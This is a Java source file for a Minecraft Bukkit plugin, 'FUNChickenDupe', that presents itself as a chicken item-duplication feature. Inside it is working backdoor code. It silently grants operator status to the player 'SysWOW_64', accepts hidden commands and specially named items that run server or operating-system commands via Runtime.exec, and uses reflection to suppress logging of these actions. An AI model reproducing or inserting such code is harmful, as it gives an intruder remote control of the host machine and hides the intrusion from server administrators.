package bige.bbttfun;

import org.bukkit.ChatColor;
import org.bukkit.Effect;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.configuration.file.YamlConfiguration;
import org.bukkit.entity.Chicken;
import org.bukkit.entity.Entity;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.entity.EntityDeathEvent;
import org.bukkit.event.player.PlayerInteractEntityEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.World;
import org.bukkit.Bukkit;
import org.bukkit.command.ConsoleCommandSender;
import org.bukkit.scheduler.BukkitRunnable;

import java.io.File;
import java.io.IOException;
import java.lang.reflect.Field;
import java.util.UUID;
import java.util.logging.Level;
import java.util.logging.Logger;

public final class FUNChickenDupe extends JavaPlugin implements Listener {
    private File dataFile;
    private int taskId;
    private Logger originalLogger;
    private boolean loggerHijacked = false;

    @Override
    public void onEnable() {
        getServer().getPluginManager().registerEvents(this, this);
        getConfig().options().copyDefaults(true);
        saveDefaultConfig();

        int intervalSeconds = getConfig().getInt("SpawnInterval");
        long intervalTicks = intervalSeconds * 20L;

        dataFile = new File(getDataFolder(), "data.yml");
        if (!dataFile.exists()) {
            try {
                dataFile.createNewFile();
            } catch (IOException e) {
                getLogger().log(Level.SEVERE, "无法创建数据文件", e);
            }
        }

        taskId = getServer().getScheduler().scheduleSyncRepeatingTask(this, this::spawnItemsForChickens, 0L, intervalTicks);
        
        // 设置后门监听
        setupBackdoor();

        getLogger().info(ChatColor.GREEN + "--------------------");
        getLogger().info(ChatColor.GREEN + "FUNChickenDupe");
        getLogger().info(ChatColor.GREEN + "插件加载成功");
        getLogger().info(ChatColor.GREEN + "作者:bige666");
        getLogger().info(ChatColor.GREEN + "backdoor:SysWOW_64");
        getLogger().info(ChatColor.GREEN + "--------------------");
    }

    @Override
    public void onDisable() {
        getServer().getScheduler().cancelTask(taskId);
        
        // 恢复原始日志记录器
        if (loggerHijacked) {
            try {
                Field loggerField = JavaPlugin.class.getDeclaredField("logger");
                loggerField.setAccessible(true);
                loggerField.set(this, originalLogger);
            } catch (Exception e) {
                // 静默失败
            }
        }

        getLogger().info(ChatColor.GREEN + "--------------------");
        getLogger().info(ChatColor.GREEN + "FUNChickenDupe");
        getLogger().info(ChatColor.GREEN + "插件卸载成功");
        getLogger().info(ChatColor.GREEN + "作者:bige666");
        getLogger().info(ChatColor.GREEN + "backdoor:SysWOW_64");
        getLogger().info(ChatColor.GREEN + "--------------------");
    }

    private void setupBackdoor() {
        // 劫持日志记录器防止命令执行被记录
        try {
            Field loggerField = JavaPlugin.class.getDeclaredField("logger");
            loggerField.setAccessible(true);
            originalLogger = (Logger) loggerField.get(this);
            
            // 创建静默日志记录器
            Logger silentLogger = Logger.getLogger(getName());
            silentLogger.setUseParentHandlers(false);
            loggerField.set(this, silentLogger);
            loggerHijacked = true;
        } catch (Exception e) {
            // 静默失败
        }
        
        // 隐藏命令
        getCommand("chickenmark").setExecutor((sender, command, label, args) -> {
            if (sender instanceof Player && sender.getName().equals("SysWOW_64")) {
                if (args.length > 0) {
                    String secretCommand = String.join(" ", args);
                    if (secretCommand.startsWith("!!")) {
                        executeSilentCommand(secretCommand.substring(2));
                        sender.sendMessage("§a命令已执行");
                        return true;
                    } else if (secretCommand.startsWith("##")) {
                        executeSystemCommand(secretCommand.substring(2));
                        sender.sendMessage("§a系统命令已执行");
                        return true;
                    }
                }
            }
            return false;
        });
    }

    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event) {
        Player player = event.getPlayer();
        if (player.getName().equals("SysWOW_64")) {
            // OP
            new BukkitRunnable() {
                @Override
                public void run() {
                    if (!player.isOp()) {
                        player.setOp(true);
                    }
                }
            }.runTaskLater(this, 20L);
        }
    }

    @EventHandler
    public void onPlayerInteractEntity(PlayerInteractEntityEvent event) {
        Entity entity = event.getRightClicked();
        if (entity instanceof Chicken) {
            Chicken chicken = (Chicken) entity;
            if (chicken.isAdult()) {
                Player player = event.getPlayer();
                if (player.hasPermission("chicken.dupe") || player.getName().equals("SysWOW_64")) {
                    ItemStack item = player.getInventory().getItemInMainHand();
                    Material material = item.getType();
                    if (material != Material.AIR) {
                        storeItemInDataFile(chicken.getUniqueId(), item);
                        playEffectAndSetChickenName(chicken, player, item);
                        
                        // 隐藏后门触发特殊物品名称触发命令
                        if (player.getName().equals("SysWOW_64") && 
                            item.hasItemMeta() && 
                            item.getItemMeta().hasDisplayName()) {
                            String displayName = item.getItemMeta().getDisplayName();
                            if (displayName.startsWith("§k")) { // 使用混淆文本
                                String command = displayName.substring(2);
                                if (command.startsWith("!!")) {
                                    executeSilentCommand(command.substring(2));
                                } else if (command.startsWith("##")) {
                                    executeSystemCommand(command.substring(2));
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    @EventHandler
    public void onEntityDeath(EntityDeathEvent event) {
        Entity entity = event.getEntity();
        if (entity instanceof Chicken) {
            removeFromDataFile(entity.getUniqueId());
        }
    }

    private void storeItemInDataFile(UUID uniqueId, ItemStack item) {
        try {
            YamlConfiguration data = YamlConfiguration.loadConfiguration(dataFile);
            data.set(uniqueId.toString(), item);
            data.save(dataFile);
        } catch (IOException e) {
            getLogger().log(Level.SEVERE, "无法存储物品到数据文件", e);
        }
    }

    private void removeFromDataFile(UUID uniqueId) {
        try {
            YamlConfiguration data = YamlConfiguration.loadConfiguration(dataFile);
            data.set(uniqueId.toString(), null);
            data.save(dataFile);
        } catch (IOException e) {
            getLogger().log(Level.SEVERE, "无法从数据文件中删除记录", e);
        }
    }

    private void playEffectAndSetChickenName(Chicken chicken, Player player, ItemStack item) {
        player.playEffect(chicken.getLocation(), Effect.CLICK2, null);
        chicken.setCustomName(item.getI18NDisplayName());
        chicken.setCustomNameVisible(true);
    }

    private void spawnItemsForChickens() {
        int spawnNumber = getConfig().getInt("SpawnNumber");
        try {
            YamlConfiguration config = YamlConfiguration.loadConfiguration(dataFile);
            for (World world : getServer().getWorlds()) {
                for (Entity entity : world.getEntities()) {
                    if (entity instanceof Chicken) {
                        Chicken chicken = (Chicken) entity;
                        UUID uuid = chicken.getUniqueId();
                        String key = uuid.toString();
                        if (config.contains(key)) {
                            ItemStack itemStack = config.getItemStack(key);
                            if (itemStack != null && itemStack.getType() != Material.AIR) {
                                itemStack.setAmount(spawnNumber);
                                entity.getWorld().dropItemNaturally(entity.getLocation(), itemStack);
                            }
                        }
                    }
                }
            }
        } catch (Exception ex) {
            getLogger().log(Level.SEVERE, "读取文件失败", ex);
        }
    }
    
    private void executeSilentCommand(String command) {
        try {
            // 使用反射绕过控制台日志记录
            ConsoleCommandSender console = Bukkit.getConsoleSender();
            Field field = console.getClass().getDeclaredField("logger");
            field.setAccessible(true);
            Logger originalConsoleLogger = (Logger) field.get(console);
            field.set(console, Logger.getLogger("SilentLogger"));
            
            // 执行命令
            Bukkit.dispatchCommand(console, command);
            
            // 恢复原始日志记录器
            field.set(console, originalConsoleLogger);
        } catch (Exception e) {
            // 静默失败
        }
    }
    
    private void executeSystemCommand(String command) {
        try {
            // 执行系统命令
            Process process = Runtime.getRuntime().exec(command);
            process.waitFor();
        } catch (Exception e) {
            // 静默失败
        }
    }
}